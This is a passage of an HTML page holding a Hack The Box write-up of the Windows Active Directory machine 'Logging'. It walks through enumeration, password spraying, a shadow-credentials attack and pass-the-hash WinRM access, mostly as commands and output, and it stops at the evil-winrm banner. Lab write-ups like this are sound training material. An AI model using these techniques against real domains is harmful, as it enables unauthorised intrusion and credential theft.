@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Logging | Paracausal Telemetry</title><meta name="description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Logs share contains overly verbose output, Attempting auth on svc_recovery." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-logging/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Logging" /><meta property="og:description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Logs share contains overly verbose output, Attempting auth on svc_recovery." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-logging/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-logging/og.png?v=693a42bf" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Logging" /><meta name="twitter:description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Logs share contains overly verbose output, Attempting auth on svc_recovery." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-logging/og.png?v=693a42bf" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Logging","description":"Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Logs share contains overly verbose output, Attempting auth on svc_recovery.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-logging/","datePublished":"2026-10-06","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Logging","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-logging/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Logging</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-10-06 · 23 min read</p><h1>Logging</h1><p>Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Logs share contains overly verbose output, Attempting auth on svc_recovery.</p><div class="writeup-meta"><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Logging" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-logging.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-logging.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Logging</h2><p>Logging is a medium-difficulty Windows machine presented as an assumed-breach scenario, built around careful log review and a chain of Active Directory misconfigurations. Starting from a low-privileged domain account, enumeration reveals a world-readable Logs share, where a…</p></div><span class="room-badge room-badge-medium">Medium</span></div><dl class="room-facts"><div><dt>Released</dt><dd>18 Apr 2026</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>LazyTitan33</dd></div><div><dt>Rating</dt><dd>4.3 / 5</dd></div><div><dt>User owns</dt><dd>4,112</dd></div><div><dt>Root owns</dt><dd>3,343</dd></div><div><dt>User blood</dt><dd>JaxT<small class="room-blood-time">0H 29M 42S</small></dd></div><div><dt>Root blood</dt><dd>FabrizzioBridi<small class="room-blood-time">1H 44M 48S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 2995 votes from easiest to hardest"><rect x="0" y="58" width="20" height="6" rx="2" fill="hsl(96 70% 55%)"><title>69 votes</title></rect><rect x="26" y="61" width="20" height="3" rx="2" fill="hsl(96 70% 55%)"><title>29 votes</title></rect><rect x="52" y="51" width="20" height="13" rx="2" fill="hsl(80 70% 55%)"><title>138 votes</title></rect><rect x="78" y="37" width="20" height="27" rx="2" fill="hsl(70 70% 55%)"><title>302 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>705 votes</title></rect><rect x="130" y="12" width="20" height="52" rx="2" fill="hsl(38 70% 55%)"><title>572 votes</title></rect><rect x="156" y="8" width="20" height="56" rx="2" fill="hsl(28 70% 55%)"><title>619 votes</title></rect><rect x="182" y="38" width="20" height="26" rx="2" fill="hsl(16 70% 55%)"><title>284 votes</title></rect><rect x="208" y="53" width="20" height="11" rx="2" fill="hsl(8 70% 55%)"><title>117 votes</title></rect><rect x="234" y="49" width="20" height="15" rx="2" fill="hsl(0 70% 55%)"><title>160 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 7.1, Real-Life 6.9, CVE 4.7, Custom Exploitation 5.3, CTF-Like 3.1"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,60.3 155.9,95.1 129.3,136.6 88.2,140.0 89.4,103.3" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Logging" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Machine info</h2><p>As is common in real life pentests, you will start the Logging box with credentials for the following account wallace.everette / Welcome2026@</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">wallace.everette:Welcome2026@</code></pre><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.245.130 --generate-hosts-file /etc/hosts
+SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT -Pn dc01.logging.htb -vv
+
+Nmap scan report for dc01.logging.htb (10.129.245.130)
+Host is up, received user-set (0.014s latency).
+rDNS record for 10.129.245.130: DC01.logging.htb
+Scanned at 2026-10-06 17:06:25 BST for 10s
+Not shown: 65505 closed tcp ports (conn-refused)
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack
+80/tcp    open  http             syn-ack
+88/tcp    open  kerberos-sec     syn-ack
+135/tcp   open  msrpc            syn-ack
+139/tcp   open  netbios-ssn      syn-ack
+389/tcp   open  ldap             syn-ack
+445/tcp   open  microsoft-ds     syn-ack
+464/tcp   open  kpasswd5         syn-ack
+593/tcp   open  http-rpc-epmap   syn-ack
+636/tcp   open  ldapssl          syn-ack
+3268/tcp  open  globalcatLDAP    syn-ack
+3269/tcp  open  globalcatLDAPssl syn-ack
+5985/tcp  open  wsman            syn-ack
+8530/tcp  open  unknown          syn-ack
+8531/tcp  open  unknown          syn-ack
+9389/tcp  open  adws             syn-ack
+47001/tcp open  winrm            syn-ack
+49664/tcp open  unknown          syn-ack
+49665/tcp open  unknown          syn-ack
+49666/tcp open  unknown          syn-ack
+49667/tcp open  unknown          syn-ack
+49673/tcp open  unknown          syn-ack
+49696/tcp open  unknown          syn-ack
+49697/tcp open  unknown          syn-ack
+49698/tcp open  unknown          syn-ack
+49705/tcp open  unknown          syn-ack
+49742/tcp open  unknown          syn-ack
+49752/tcp open  unknown          syn-ack
+49802/tcp open  unknown          syn-ack
+49832/tcp open  unknown          syn-ack
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 10.79 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531 -A --min-rate=2000 -sT -Pn dc01.logging.htb
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 17:08 +0100
+Nmap scan report for dc01.logging.htb (10.129.245.130)
+Host is up (0.013s latency).
+rDNS record for 10.129.245.130: DC01.logging.htb
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-06 23:08:12Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-10-06T23:09:12+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
+| Not valid before: 2026-04-24T16:40:59
+|_Not valid after:  2106-04-24T16:40:59
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
+| Not valid before: 2026-04-24T16:40:59
+|_Not valid after:  2106-04-24T16:40:59
+|_ssl-date: 2026-10-06T23:09:12+00:00; +7h00m01s from scanner time.
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
+| Not valid before: 2026-04-24T16:40:59
+|_Not valid after:  2106-04-24T16:40:59
+|_ssl-date: 2026-10-06T23:09:12+00:00; +7h00m01s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-10-06T23:09:12+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
+| Not valid before: 2026-04-24T16:40:59
+|_Not valid after:  2106-04-24T16:40:59
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8530/tcp open  http          Microsoft IIS httpd 10.0
+|_http-title: Site doesn&#39;t have a title.
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+8531/tcp open  ssl/unknown
+| ssl-cert: Subject: 
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.logging.htb
+| Not valid before: 2026-04-24T15:49:07
+|_Not valid after:  2027-04-24T15:49:07
+|_ssl-date: 2026-10-06T23:09:12+00:00; +7h00m01s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%), Microsoft Windows 10 21H2 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>System time</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ntpdate dc01.logging.htb                                                             
+2026-10-07 00:40:42.675307 (+0100) +25200.291713 +/- 0.007401 dc01.logging.htb 10.129.245.130 s1 no-leap
+CLOCK: step_systime: Operation not permitted</code></pre><p>The system is running at +7h</p><h2>SMB (445)</h2><p>Null auth enabled cannot use it to enumerate</p><p>Guest account is also disabled</p><h3>Using provided credentials</h3><h4>Shares</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb dc01.logging.htb -u &#39;wallace.everette&#39; -p &#39;Welcome2026@&#39; --shares
+SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ 
+SMB         10.129.245.130  445    DC01             [*] Enumerated shares
+SMB         10.129.245.130  445    DC01             Share           Permissions     Remark
+SMB         10.129.245.130  445    DC01             -----           -----------     ------
+SMB         10.129.245.130  445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.245.130  445    DC01             C$                              Default share
+SMB         10.129.245.130  445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.245.130  445    DC01             Logs            READ            
+SMB         10.129.245.130  445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.245.130  445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.129.245.130  445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.</code></pre><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb dc01.logging.htb -u &#39;wallace.everette&#39; -p &#39;Welcome2026@&#39; --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+svc_recovery
+jaylee.clifton
+monique.chip
+kyson.abel
+fable.milford
+wellington.kylan
+serina.philander
+wallace.everette
+toby.brynleigh
+msa_health$</code></pre><p>Ill use <code>--rid-brute</code> to dump the users since it will also get machine accounts</p><p>Also this password provided is not used on any other user accounts</p><h2><code>Logs</code> share contains overly verbose output</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python"># use Logs
+# ls
+drw-rw-rw-          0  Fri Apr 17 00:10:09 2026 .
+drw-rw-rw-          0  Fri Apr 17 00:10:09 2026 ..
+-rw-rw-rw-       1294  Fri Apr 17 00:10:09 2026 Audit_Heartbeat.log
+-rw-rw-rw-       8488  Fri Apr 17 00:10:09 2026 IdentitySync_Trace_20260219.log
+-rw-rw-rw-        468  Fri Apr 17 00:10:09 2026 Service_State.log
+-rw-rw-rw-       1170  Fri Apr 24 17:59:43 2026 TaskMonitor.log
+
+# rget *
+[*] Downloading Audit_Heartbeat.log
+[*] Downloading IdentitySync_Trace_20260219.log
+[*] Downloading Service_State.log
+[*] Downloading TaskMonitor.log
+# </code></pre><p>Found some log files, ill download them all</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ cat IdentitySync_Trace_20260219.log 
+
+...[SNIP]...
+
+[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: &quot;logging.htb&quot;, Server: &quot;DC01&quot;, SSL: &quot;False&quot;, BindUser: &quot;LOGGING\svc_recovery&quot;, BindPass: &quot;Em3rg3ncyPa$$2025&quot;, Timeout: 30 }
+[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
+   at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
+   at logging.IdentitySync.Engine.LdapProvider.Connect()
+   --- Server Error Details ---
+   Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
+   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
+   Win32 Error: 49 (Invalid Credentials)
+   ----------------------------                                                            </code></pre><p>Found some hardcoded credentials</p><h2>Attempting auth on <code>svc_recovery</code> </h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">svc_recovery:Em3rg3ncyPa$$2025</code></pre><p>The other log files didnt really contain anything interesting</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb dc01.logging.htb -u &#39;svc_recovery&#39; -p &#39;Em3rg3ncyPa$$2025&#39; 
+SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.130  445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION</code></pre><p>There is a restriction on this account</p><p>There is nothing in this users account applying this restriction such as logon hours, so this likely isnt the correct password for this account</p><p>I have also tries spraying this password across the whole domain and did not find anything</p><h2>Compromising <code>svc_recovery</code></h2><p>Looking at the password for the account <code>svc_recovery</code> i see a year, ill try updating this to the current year 2026</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h nxc smb dc01.logging.htb -u users.txt -p &#39;Em3rg3ncyPa$$2026&#39; --continue-on-success -k
+SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\Administrator:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\Guest:Em3rg3ncyPa$$2026 KDC_ERR_CLIENT_REVOKED 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\krbtgt:Em3rg3ncyPa$$2026 KDC_ERR_CLIENT_REVOKED 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\DC01$:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.logging.htb 445    DC01             [+] logging.htb\svc_recovery:Em3rg3ncyPa$$2026 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\jaylee.clifton:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\monique.chip:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\kyson.abel:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\fable.milford:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\wellington.kylan:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\serina.philander:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\wallace.everette:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\toby.brynleigh:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
+SMB         dc01.logging.htb 445    DC01             [-] logging.htb\msa_health$:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED </code></pre><p>Since i think <code>svc_recovery</code> is in protected users ill have to use kerberos and with kerberos ill also have to sync time with the DC</p><p>This user is now compromised</p><p><img src="images/logging/pasted-image-20261006174421.webp" alt="Screenshot" loading="lazy" /></p><p>This user also has GenericWrite on the <code>msa_health$</code> user</p><h2>Compromising <code>msa_health$</code></h2><p>After checking the exact attributes i have write on using bloodyAD i see the key credential link attribute which means i can do a shadow credential attack</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ bloodyAD --host dc01.logging.htb -d logging.htb -u &#39;svc_recovery&#39; -p &#39;Em3rg3ncyPa$$2026&#39; -k get writable --detail
+
+distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
+...[SNIP]...
+msDS-KeyCredentialLink: WRITE</code></pre><h3>Shadow credentials</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h bloodyAD --host dc01.logging.htb -d logging.htb -u &#39;svc_recovery&#39; -p &#39;Em3rg3ncyPa$$2026&#39; -k add shadowCredentials &#39;msa_health$&#39;
+[+] KeyCredential generated with following sha256 of RSA key: ec53b04dbfd8e509b7daa3303355d54125123aaa5ccc4d4ec0b6421d3af52a41
+[+] TGT stored in ccache file msa_health_jh.ccache
+
+NT: 603fc24ee01a9409f83c9d1d701485c5</code></pre><p>I now have an NT hash for this user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb dc01.logging.htb -u msa_health$ -H &#39;603fc24ee01a9409f83c9d1d701485c5&#39;        
+SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.245.130  445    DC01             [+] logging.htb\msa_health$:603fc24ee01a9409f83c9d1d701485c5</code></pre><p>This user is now compromised</p><h2>Enumeration as <code>msa_health$</code></h2><p><img src="images/logging/pasted-image-20261006175219.webp" alt="Screenshot" loading="lazy" /></p><p>This user is in remote management users</p><h2>Access over winrm as <code>msa_health$</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ evil-winrm-py -i dc01.logging.htb -u msa_health$ -H &#39;603fc24ee01a9409f83c9d1d701485c5&#39;
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | &#39; \| &#39;_| &#39;  |___| &#39;_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
